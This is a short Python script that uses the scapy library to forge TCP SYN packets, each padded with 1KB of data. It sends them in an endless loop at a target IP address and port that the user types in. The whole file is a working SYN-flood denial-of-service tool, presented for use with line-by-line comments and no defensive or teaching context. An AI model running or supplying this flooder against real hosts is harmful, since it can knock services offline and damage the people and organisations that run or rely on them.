from scapy.all import *

def flood(target_ip, target_port):
    # forge IP packet with target IP as the destination IP address
    ip = IP(dst=target_ip)
    # forge a TCP SYN packet with a random source port
    # and the target port as the destination port
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    # add some flooding data (1KB in this case, don't increase it too much,
    # otherwise, it won't work.)
    raw = Raw(b"X"*1024)
    # stack up the layers
    p = ip / tcp / raw
    # send the constructed packet in a loop until CTRL+C is detected
    send(p, loop=1, verbose=0)

# Prompt user for target IP and port
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

# Call the flood function with user-provided inputs
flood(target_ip, target_port)
